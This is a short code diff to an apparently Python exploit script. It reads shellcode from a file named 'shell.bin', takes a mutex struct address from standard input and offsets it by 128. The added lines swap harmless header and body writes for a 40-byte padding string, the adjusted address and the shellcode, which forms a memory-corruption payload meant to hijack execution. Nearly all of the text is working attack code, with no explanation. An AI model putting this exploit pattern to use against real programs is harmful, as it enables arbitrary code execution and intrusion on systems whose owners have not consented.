@@ -32,6 +32,9 @@ with open("shell.bin", "rb") as f:
 # Here we have the address of the mutex struct.
 pmutex = int(sys.stdin.readline(), 16)
 
-writeStr("Header\n")
+pmutex = pmutex - 128
 
-writeStr("Body\n")
+writeStr("1234567812345678123456781234567812345678")
+writeLong(pmutex)
+writeStr("\n")
+writeBytes(payload)
